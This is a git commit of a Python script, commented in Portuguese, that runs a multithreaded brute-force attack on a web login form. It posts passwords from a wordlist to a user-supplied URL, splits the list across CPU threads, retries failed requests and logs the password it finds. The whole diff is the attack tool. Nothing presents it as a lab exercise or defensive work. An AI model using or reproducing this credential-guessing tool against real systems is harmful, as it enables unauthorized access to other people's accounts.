8554f29ce49f193cf3ed145de676177a99479487
ErickCassoli <erick.mcassoli@gmail.com>
2023-09-07 01:57:34 -0300

    aplicação funcionando.

--- The-bucket.py
+++ The-bucket.py
@@ -1,31 +1,94 @@
 import requests
+import threading
+import time
+import logging
+from tqdm import tqdm
+import os
 
+# Configuração de log
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s: %(message)s')
+logger = logging.getLogger(__name__)
+
+# Número de solicitações antes de pausar
+requests_before_pause = 100000
+
+# Duração da pausa em segundos
+pause_duration = 5
+
+# Número de threads (metade do número de núcleos da CPU)
+num_threads = os.cpu_count() // 2
+
+# Limite de tentativas para evitar bloqueio (pode ser ajustado)
+max_attempts = 3
+
+# Variável compartilhada para armazenar a senha encontrada
+found_password = None
+
+# Função para fazer solicitações de autenticação
+def make_auth_request(session, target_url, username, password):
+    global found_password  # Acessa a variável global
+    data = {"username": username, "password": password}
+    attempts = 0
+    while attempts < max_attempts:
+        try:
+            response = session.post(target_url, data=data, timeout=5)
+            response.raise_for_status()  # Verifica se houve um erro na resposta
+
+            if response.status_code == 200:
+                found_password = password  # Senha correta encontrada
+                return
+            elif response.status_code == 401:
+                logger.info(f"Senha incorreta para: {password}")
+        except requests.exceptions.RequestException:
+            pass
+        attempts += 1
+
+# Função para ataque de força bruta em um chunk de senhas
+def brute_force_attack_chunk(target_url, username, password_chunk, progress_bar):
+    session = requests.Session()
+
+    for password in tqdm(password_chunk, desc="Testando senhas", unit=" senha", leave=False):
+        if found_password:
+            break  # Se a senha já foi encontrada em outra thread, encerra
+        make_auth_request(session, target_url, username, password)
+
+    progress_bar.update(len(password_chunk))
+
+# Função principal do ataque de força bruta
 def brute_force_attack(target_url, username, password_file):
     with open(password_file, "r") as file:
         passwords = file.read().splitlines()
 
-    for password in passwords:
-        data = {"username": username, "password": password}
-        response = requests.post(target_url, data=data)
+    total_passwords = len(passwords)  # Número total de senhas a testar
+    chunk_size = total_passwords // num_threads  # Tamanho do chunk por thread
 
-        if response.status_code == 200:
-            print(f"Senha correta encontrada: {password}")
-            return password
-        elif response.status_code == 401:
-            print(f"Senha incorreta para: {password}")
-        else:
-            print(f"Erro inesperado: {response.status_code}")
+    threads = []
 
-    print("Nenhuma senha válida encontrada.")
-    return None
+    logger.info("Iniciando ataque de força bruta...")
 
-target_url = input('Digite a URL: ')
-username = input('Digite o usuário: ')
-password_file = input('Digite o nome da wordlist: ')
+    progress_bar = tqdm(total=total_passwords, desc="Testando senhas", unit=" senha")
 
-found_password = brute_force_attack(target_url, username, password_file)
+    for i in range(num_threads):
+        start = i * chunk_size
+        end = start + chunk_size if i < num_threads - 1 else total_passwords
+        password_chunk = passwords[start:end]
+        thread = threading.Thread(target=brute_force_attack_chunk, args=(target_url, username, password_chunk, progress_bar))
+        threads.append(thread)
+        thread.start()
 
-if found_password:
-    print(f"A senha correta é: {found_password}")
-else:
-    print("Nenhuma senha válida encontrada.")
+    for thread in threads:
+        thread.join()
+
+    progress_bar.close()  # Fecha a barra de progresso
+
+    if found_password:
+        logger.info(f"Senha correta é: {found_password}")
+    else:
+        logger.info("Nenhuma senha válida encontrada.")
+
+if __name__ == "__main__":
+    target_url = input('Digite a URL: ')
+    username = input('Digite o usuário: ')
+    password_file = input('Digite o nome da wordlist: ')
+
+    brute_force_attack(target_url, username, password_file)
